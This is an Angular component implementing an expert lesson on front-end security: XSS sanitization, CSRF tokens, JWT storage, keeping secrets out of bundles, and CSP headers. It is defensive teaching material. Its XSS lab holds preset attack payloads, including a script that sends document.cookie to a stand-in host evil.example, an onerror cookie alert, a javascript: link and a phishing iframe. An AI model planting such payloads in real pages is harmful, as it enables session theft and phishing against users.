import { Component, SecurityContext, computed, inject, signal } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { DomSanitizer } from '@angular/platform-browser';
import { RouterLink } from '@angular/router';

type Tab = 'xss' | 'csrf' | 'auth' | 'secrets' | 'headers';

@Component({
  selector: 'app-lesson-security',
  imports: [RouterLink, FormsModule],
  styles: [`
    .tab-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; }
    .tab-row button { padding: 6px 14px; border-radius: 20px; border: 1px solid var(--border);
      background: var(--surface); cursor: pointer; font-size: .85rem; color: var(--text); }
    .tab-row button.active { background: #6366f1; color: #fff; border-color: #6366f1; }
    .sec-table { width: 100%; border-collapse: collapse; font-size: .87rem; margin: 12px 0; }
    .sec-table th { background: var(--surface); padding: 8px 10px; text-align: left; border-bottom: 2px solid var(--border); }
    .sec-table td { padding: 8px 10px; border-bottom: 1px solid var(--border); vertical-align: top; }
    .bad { color: #ef4444; }
    .good { color: #22c55e; }
    .owasp-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 10px; margin: 12px 0; }
    .owasp-card { padding: 10px 14px; border: 1px solid var(--border); border-radius: 10px; background: var(--surface); }
    .owasp-card h4 { margin: 0 0 4px; font-size: .88rem; }
    .owasp-card p { margin: 0; font-size: .8rem; color: var(--text-muted); }
    .severity-high { border-left: 3px solid #ef4444; }
    .severity-med  { border-left: 3px solid #f59e0b; }
    .severity-low  { border-left: 3px solid #22c55e; }
  `],
  template: `
    <article class="lesson">
      <span class="lesson__eyebrow">Expert · Cross-Cutting</span>
      <h1>Security &amp; Sanitization</h1>
      <p class="lead">
        Angular is secure by default — but "by default" only gets you so far.
        A senior dev understands <em>why</em> it's secure, where the gaps are, and
        how to defend the whole application stack: XSS, CSRF, auth token handling,
        secrets, and HTTP headers.
      </p>

      <div class="tab-row">
        @for (t of tabs; track t.id) {
          <button [class.active]="activeTab() === t.id" (click)="activeTab.set(t.id)">
            {{ t.label }}
          </button>
        }
      </div>

      @if (activeTab() === 'xss') {
        <h2>XSS — Angular's built-in defenses</h2>
        <p>
          Cross-Site Scripting (XSS) is the #1 web vulnerability. Angular neutralizes it
          by treating every value bound into the DOM as <strong>untrusted</strong> and
          sanitizing by context before rendering.
        </p>
        <div class="code">
          <pre>// Interpolation always HTML-escapes — script tags become literal text:
&lt;p&gt;{{ '{{' }} userInput {{ '}}' }}&lt;/p&gt;
// userInput = "&lt;script&gt;alert(1)&lt;/script&gt;" → renders as TEXT, never runs

// [innerHTML] sanitizes — strips event handlers and script tags:
&lt;div [innerHTML]="richText"&gt;&lt;/div&gt;
// richText = '&lt;b&gt;Hi&lt;/b&gt;&lt;script&gt;evil()&lt;/script&gt;' → only &lt;b&gt;Hi&lt;/b&gt; survives

// [href] blocks javascript: URLs automatically
&lt;a [href]="url"&gt;link&lt;/a&gt;
// url = "javascript:steal()" → blocked by URL-context sanitizer

// [src] on &lt;iframe&gt; / &lt;script&gt; is a RESOURCE_URL — must use DomSanitizer
&lt;iframe [src]="safeSrc"&gt;&lt;/iframe&gt;</pre>
        </div>

        <h2>Live — the sanitizer, opened up</h2>
        <div class="demo">
          <p class="demo__title">XSS lab — edit the payload or load a preset attack</p>
          <div class="row" style="margin-bottom:10px">
            @for (p of presets; track p.label) {
              <button class="ghost" (click)="payload.set(p.html)">{{ p.label }}</button>
            }
          </div>
          <textarea rows="3" style="width:100%;font-family:monospace;font-size:.82rem"
            [ngModel]="payload()" (ngModelChange)="payload.set($event)"></textarea>

          <p style="margin:12px 0 4px">What the sanitizer lets through — the <em>exact</em> HTML Angular writes to the DOM:</p>
          <div class="code" style="font-size:.82rem"><pre>{{ sanitized() }}</pre></div>

          <p style="margin:12px 0 4px">Rendered result:</p>
          <div [innerHTML]="payload()"
            style="padding:10px 14px;border:1px dashed var(--border);border-radius:8px;min-height:2.4em"></div>

          <p class="note" style="margin-top:10px">
            Formatting tags (<code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, lists, links) survive.
            <code>&lt;script&gt;</code> is removed entirely, event handlers like
            <code>onerror</code> are stripped off their elements, and
            <code>javascript:</code> URLs are neutered to <code>unsafe:javascript:…</code> —
            the link renders but the browser refuses the scheme. No payload here can
            execute. Open the console: Angular even warns you that it sanitized something.
          </p>
        </div>

        <h2>Bypassing — the last resort</h2>
        <div class="code">
          <pre>import {{ '{' }} DomSanitizer {{ '}' }} from '&#64;angular/platform-browser';

&#64;Component({{ '{' }}...{{ '}' }})
export class VideoPlayer {{ '{' }}
  private san = inject(DomSanitizer);

  // ONLY for URLs you fully control (e.g., a fixed CDN domain):
  trustedSrc = this.san.bypassSecurityTrustResourceUrl('https://cdn.example.com/video.mp4');
{{ '}' }}

// In template:
&lt;iframe [src]="trustedSrc"&gt;&lt;/iframe&gt;</pre>
        </div>
        <div class="warn">
          <strong>Never</strong> call <code>bypassSecurityTrust*</code> on user-supplied
          data or anything that can contain attacker-controlled values. Every call
          should be code-reviewed. Use Trusted Types (CSP header) to enforce this at
          the browser level.
        </div>

        <h2>DomSanitizer context methods</h2>
        <table class="sec-table">
          <tr><th>Method</th><th>Use for</th></tr>
          <tr><td><code>bypassSecurityTrustHtml</code></td><td>[innerHTML] — rich HTML you own</td></tr>
          <tr><td><code>bypassSecurityTrustStyle</code></td><td>[style] — dynamic CSS you control</td></tr>
          <tr><td><code>bypassSecurityTrustUrl</code></td><td>[href] / [src] — regular URLs</td></tr>
          <tr><td><code>bypassSecurityTrustResourceUrl</code></td><td>[src] on iframe/script/video</td></tr>
          <tr><td><code>bypassSecurityTrustScript</code></td><td>Injected script content (almost never)</td></tr>
        </table>
      }

      @if (activeTab() === 'csrf') {
        <h2>CSRF — Angular's automatic protection</h2>
        <p>
          Cross-Site Request Forgery tricks a logged-in user's browser into sending a
          forged request to your API. Angular's <code>HttpClient</code> defends against
          it automatically using the <strong>double-submit cookie</strong> pattern.
        </p>
        <div class="code">
          <pre>// app.config.ts — enable XSRF protection (Angular reads the cookie
// and mirrors it in the X-XSRF-TOKEN request header automatically):
export const appConfig: ApplicationConfig = {{ '{' }}
  providers: [
    provideHttpClient(
      withXsrfConfiguration({{ '{' }}
        cookieName: 'XSRF-TOKEN',      // your server sets this cookie
        headerName: 'X-XSRF-TOKEN',    // Angular sends this header
      {{ '}' }})
    ),
  ],
{{ '}' }};</pre>
        </div>
        <div class="note">
          Your server must: (1) set the <code>XSRF-TOKEN</code> cookie (readable by JS,
          not HttpOnly), and (2) verify the <code>X-XSRF-TOKEN</code> request header
          matches. Angular handles step 2 client-side; your backend handles verification.
          Spring Security and Express both have built-in CSRF middleware that works with
          this header convention.
        </div>

        <h2>What protects you vs. what doesn't</h2>
        <table class="sec-table">
          <tr><th>Scenario</th><th>CSRF risk?</th></tr>
          <tr><td>Traditional cookie-based session, mutating POST</td><td class="bad">Yes — need CSRF token</td></tr>
          <tr><td>JWT in Authorization header (not cookie)</td><td class="good">No — browsers won't auto-attach headers</td></tr>
          <tr><td>GET requests (read-only)</td><td class="good">No — should never mutate state</td></tr>
          <tr><td>Cookie with SameSite=Strict/Lax</td><td class="good">Mitigated for most cases</td></tr>
          <tr><td>withCredentials: true + JWT-in-cookie</td><td class="bad">Yes — still need CSRF token</td></tr>
        </table>
      }

      @if (activeTab() === 'auth') {
        <h2>Auth token handling — JWT dos and don'ts</h2>
        <p>
          Where you store a JWT matters enormously. Each option trades off between
          XSS risk and CSRF risk.
        </p>
        <table class="sec-table">
          <tr><th>Storage</th><th>XSS risk</th><th>CSRF risk</th><th>Verdict</th></tr>
          <tr>
            <td><code>localStorage</code></td>
            <td class="bad">High — any JS can read it</td>
            <td class="good">None</td>
            <td class="bad">Avoid for session tokens</td>
          </tr>
          <tr>
            <td>JS memory (signal/service)</td>
            <td>Medium — lost on refresh</td>
            <td class="good">None</td>
            <td>OK for short-lived access tokens</td>
          </tr>
          <tr>
            <td>HttpOnly cookie (server-set)</td>
            <td class="good">None — JS can't read it</td>
            <td class="bad">Present — need CSRF token</td>
            <td class="good">Best for refresh tokens</td>
          </tr>
        </table>

        <h2>Auth guard pattern</h2>
        <div class="code">
          <pre>// Functional route guard — no class needed
export const authGuard: CanActivateFn = (route, state) =&gt; {{ '{' }}
  const auth = inject(AuthService);
  const router = inject(Router);

  if (auth.isLoggedIn()) return true;

  // Save where they were going; redirect after login
  return router.createUrlTree(['/login'], {{ '{' }}
    queryParams: {{ '{' }} returnUrl: state.url {{ '}' }}
  {{ '}' }});
{{ '}' }};

// In routes:
{{ '{' }}
  path: 'dashboard',
  loadComponent: () =&gt; import('./dashboard').then(m =&gt; m.Dashboard),
  canActivate: [authGuard],
{{ '}' }}</pre>
        </div>

        <h2>HTTP interceptor for token attachment</h2>
        <div class="code">
          <pre>export const authInterceptor: HttpInterceptorFn = (req, next) =&gt; {{ '{' }}
  const auth = inject(AuthService);
  const token = auth.accessToken();   // signal or method

  if (!token) return next(req);       // skip if not logged in

  const authed = req.clone({{ '{' }}
    headers: req.headers.set('Authorization', 'Bearer ' + token)
  {{ '}' }});
  return next(authed);
{{ '}' }};

// Handle 401 → refresh token flow:
export const refreshInterceptor: HttpInterceptorFn = (req, next) =&gt; {{ '{' }}
  const auth = inject(AuthService);
  return next(req).pipe(
    catchError(err =&gt; {{ '{' }}
      if (err.status !== 401) throw err;
      return auth.refreshToken().pipe(
        switchMap(() =&gt; next(req.clone({{ '{' }}
          headers: req.headers.set('Authorization', 'Bearer ' + auth.accessToken())
        {{ '}' }})))
      );
    {{ '}' }})
  );
{{ '}' }};</pre>
        </div>
      }

      @if (activeTab() === 'secrets') {
        <h2>Secrets — everything in the bundle is public</h2>
        <div class="warn">
          <strong>Rule:</strong> if it's in your Angular bundle, it is public. Do not put
          API keys, DB credentials, private tokens, or encryption secrets in your frontend
          code — not in environment files, not in TypeScript constants, not anywhere. A
          simple <code>strings ./main.js</code> or DevTools → Sources will reveal them.
        </div>

        <h2>What to put in environment files vs. server</h2>
        <table class="sec-table">
          <tr><th>Value</th><th>Where it lives</th></tr>
          <tr><td>Public API base URL (your own backend)</td><td class="good">environment.ts — fine</td></tr>
          <tr><td>Google Analytics measurement ID (public by design)</td><td class="good">environment.ts — fine</td></tr>
          <tr><td>Third-party API key that has rate-limit/billing</td><td class="bad">Backend proxy only</td></tr>
          <tr><td>Stripe secret key, database password, JWT secret</td><td class="bad">Server env vars only — never in the bundle</td></tr>
          <tr><td>OpenAI / LLM API keys</td><td class="bad">Backend proxy — never in the browser</td></tr>
        </table>

        <h2>Pattern: backend proxy for third-party APIs</h2>
        <div class="code">
          <pre>// Angular makes requests to YOUR backend:
this.http.post('/api/chat', {{ '{' }} message {{ '}' }})

// Your server (Node/Spring/etc.) calls the third party with the secret:
// server.ts
const res = await openai.createCompletion({{ '{' }}
  apiKey: process.env.OPENAI_KEY,   // env var — never in the client
  ...
{{ '}' }});</pre>
        </div>

        <h2>Angular environment files</h2>
        <div class="code">
          <pre>// src/environments/environment.ts (committed to git — public)
export const environment = {{ '{' }}
  production: false,
  apiUrl: 'http://localhost:8080',      // OK
  gaId: 'G-XXXXXXX',                   // OK — public
  // stripeSecretKey: '...'            // NEVER put this here
{{ '}' }};

// environment.prod.ts gets swapped in at build time via angular.json fileReplacements</pre>
        </div>
      }

      @if (activeTab() === 'headers') {
        <h2>Security headers &amp; Content-Security-Policy</h2>
        <p>
          HTTP response headers are your last line of defense — they tell the browser
          what it's allowed to execute. Configure them on your web server or CDN.
        </p>
        <table class="sec-table">
          <tr><th>Header</th><th>What it does</th></tr>
          <tr>
            <td><code>Content-Security-Policy</code></td>
            <td>Whitelist allowed script/style sources. Blocks inline XSS and data exfiltration.</td>
          </tr>
          <tr>
            <td><code>X-Content-Type-Options: nosniff</code></td>
            <td>Prevents browser from MIME-sniffing a response (stops polyglot file attacks).</td>
          </tr>
          <tr>
            <td><code>Strict-Transport-Security</code></td>
            <td>Forces HTTPS for the specified duration. Add after you know HTTPS works.</td>
          </tr>
          <tr>
            <td><code>X-Frame-Options: DENY</code></td>
            <td>Prevents your app from being embedded in an iframe (clickjacking defense).</td>
          </tr>
          <tr>
            <td><code>Referrer-Policy: strict-origin-when-cross-origin</code></td>
            <td>Limits how much of the URL is sent as Referer header to other origins.</td>
          </tr>
          <tr>
            <td><code>Permissions-Policy</code></td>
            <td>Disable features you don't use: camera, microphone, geolocation.</td>
          </tr>
        </table>

        <h2>Minimal Angular CSP</h2>
        <div class="code">
          <pre>Content-Security-Policy:
  default-src 'self';
  script-src  'self';          // Angular bundle only — no inline scripts
  style-src   'self' 'unsafe-inline';  // Angular inlines some styles
  img-src     'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src    'self';
  frame-ancestors 'none';      // equivalent to X-Frame-Options: DENY</pre>
        </div>
        <div class="note">
          Angular's CLI build with hashing (<code>--output-hashing=all</code>) makes
          nonces/hashes easier to manage. Use
          <a href="https://securityheaders.com" target="_blank" rel="noopener">securityheaders.com</a>
          to scan your deployed app.
        </div>

        <h2>OWASP Top 10 — Angular relevance</h2>
        <div class="owasp-grid">
          <div class="owasp-card severity-high">
            <h4>A01 Broken Access Control</h4>
            <p>Route guards prevent UI access but backend must still authorize every request.</p>
          </div>
          <div class="owasp-card severity-high">
            <h4>A02 Crypto Failures</h4>
            <p>Never store secrets client-side. Use HTTPS. Proxy secrets through backend.</p>
          </div>
          <div class="owasp-card severity-high">
            <h4>A03 Injection / XSS</h4>
            <p>Angular sanitizes by default. Avoid bypassSecurityTrust* and ElementRef.innerHTML.</p>
          </div>
          <div class="owasp-card severity-med">
            <h4>A05 Security Misconfiguration</h4>
            <p>Add CSP, HSTS, X-Content-Type-Options headers. Disable debug endpoints in prod.</p>
          </div>
          <div class="owasp-card severity-med">
            <h4>A07 Auth Failures</h4>
            <p>Store tokens safely (HttpOnly cookies &gt; memory &gt; localStorage). Expire tokens. Refresh securely.</p>
          </div>
          <div class="owasp-card severity-low">
            <h4>A08 Software/Data Integrity</h4>
            <p>Use integrity hashes on CDN scripts (SRI). Audit npm dependencies regularly.</p>
          </div>
        </div>
      }

      <h2>Key takeaways</h2>
      <ul>
        <li>Angular escapes interpolation and sanitizes [innerHTML] — XSS-safe by default.</li>
        <li><code>bypassSecurityTrust*</code> is a deliberate, code-reviewed escape hatch — never on user data.</li>
        <li>Angular auto-sends XSRF tokens; your backend must verify them for cookie-based auth.</li>
        <li>Keep secrets server-side — everything in the Angular bundle is public.</li>
        <li>Route guards protect the UI; the backend must still authorize every API call.</li>
        <li>Add CSP, HSTS and the other security headers on your server or CDN.</li>
      </ul>

      <p><a routerLink="/i18n">Next: Internationalization (i18n) →</a></p>
    </article>
  `,
})
export class Security {
  private readonly sanitizer = inject(DomSanitizer);

  protected readonly payload = signal(
    '<b>Bold survives</b>, <i>so does italic</i> — <a href="javascript:alert(1)">a boobytrapped link</a> <img src="x" onerror="alert(1)"> <script>alert(1)<\/script>',
  );

  /** The exact string Angular's HTML-context sanitizer produces for the payload. */
  protected readonly sanitized = computed(
    () =>
      this.sanitizer.sanitize(SecurityContext.HTML, this.payload()) ||
      '(the sanitizer stripped everything)',
  );

  protected readonly presets = [
    {
      label: 'script tag',
      html: 'Hello <script>document.location="https://evil.example?c="+document.cookie<\/script> world',
    },
    {
      label: 'img onerror',
      html: '<img src="x" onerror="alert(document.cookie)"> a classic — no script tag needed',
    },
    {
      label: 'javascript: link',
      html: '<a href="javascript:alert(1)">win a free prize</a>',
    },
    {
      label: 'iframe injection',
      html: '<iframe src="https://evil.example/phish"></iframe> invisible credential phishing',
    },
    {
      label: 'harmless rich text',
      html: '<b>Bold</b>, <i>italic</i>, <ul><li>lists</li><li>links: <a href="https://angular.dev">angular.dev</a></li></ul> all survive',
    },
  ];

  protected readonly activeTab = signal<Tab>('xss');
  protected readonly tabs: { id: Tab; label: string }[] = [
    { id: 'xss', label: 'XSS' },
    { id: 'csrf', label: 'CSRF' },
    { id: 'auth', label: 'Auth / JWT' },
    { id: 'secrets', label: 'Secrets' },
    { id: 'headers', label: 'Headers / CSP' },
  ];
}
